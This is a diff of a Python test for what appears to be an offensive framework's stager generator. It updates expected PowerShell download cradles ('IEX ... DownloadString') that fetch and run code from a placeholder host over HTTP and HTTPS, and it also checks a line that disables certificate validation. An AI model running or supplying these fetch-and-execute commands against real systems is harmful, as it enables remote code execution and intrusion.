@@ -104,7 +104,7 @@ def test_stager(full_app):
     assert (
         "$K=New-Object Net.WebClient;IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
-        + "/0?t=http&f=h&a=reflection');"
+        + "/0?t=http&a=reflection');"
     ) in (full_app['default'])
     assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
@@ -112,7 +112,7 @@ def test_stager(full_app):
     ) in (full_app['HTTPS'])
     assert (
         "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
-        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
+        + f"('https://{TEST_URI}:8443/0?t=https&a=reflection');"
     ) in (full_app['HTTPS'])
 
 
